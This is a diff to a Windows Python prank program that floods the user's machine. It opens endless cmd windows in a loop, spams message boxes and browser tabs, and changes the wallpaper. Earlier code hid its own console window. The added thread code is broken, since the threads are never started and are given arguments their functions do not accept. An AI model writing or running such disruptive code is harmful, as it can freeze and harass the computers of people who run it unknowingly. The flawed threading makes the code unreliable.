@@ -2,15 +2,16 @@
 import ctypes
 import win32gui
 import win32.lib.win32con as win32con
-from os import system
+import os
 import webbrowser
 import random
 from time import sleep
+import threading
 
 # <---------->
 
-# if name != "nt":
-#     exit()
+if os.name != 'nt':
+    exit("Not windows")
 
 # <---------->
 
@@ -31,10 +32,10 @@ def login():
 # <---------->
 
 
-def hide():  # USE PYINSTALLER "--window" OPTION (https://bit.ly/3C6myWa)
-    """Hide cmd window"""
-    thisprogramm = win32gui.GetForegroundWindow()
-    win32gui.ShowWindow(thisprogramm, win32con.SW_HIDE)
+#def hide():  # USE PYINSTALLER "--window" OPTION (https://bit.ly/3C6myWa)
+#    """Hide cmd window"""
+#    thisprogramm = win32gui.GetForegroundWindow()
+#    win32gui.ShowWindow(thisprogramm, win32con.SW_HIDE)
 
 # <---------->
 
@@ -48,7 +49,10 @@ def spam_msgbox():
 def spam_cmd():
     """Spam user with cmd"""
     while True:
-        system("start")
+        os.system("start")
+
+def change_wallpaper():
+    ctypes.windll.user32.SystemParametersInfoA(20, 0, "logo.png", 0)
 
 
 def spam_tabs():
@@ -56,11 +60,15 @@ def spam_tabs():
     urls = ["https://www.youtube.com/watch?v=dQw4w9WgXcQ", "https://www.youtube.com/watch?v=d1YBv2mWll0"]
     while True:
         sleep(0.1)
-        system("start")
         webbrowser.open_new_tab(random.choice(urls))
 
+# <---------->
+
+x1 = threading.Thread(target=spam_tabs, args=(1,))
+x2 = threading.Thread(target=spam_cmd, args=(1,))
+x3 = threading.Thread(target=spam_msgbox, args=(1,))
+x4 = threading.Thread(target=change_wallpaper, args=(1,))
+
+# <---------->
 
 print(LOGIN_MSG)
-spam_tabs()
-# spam_msgbox()
-# spam_cmd()
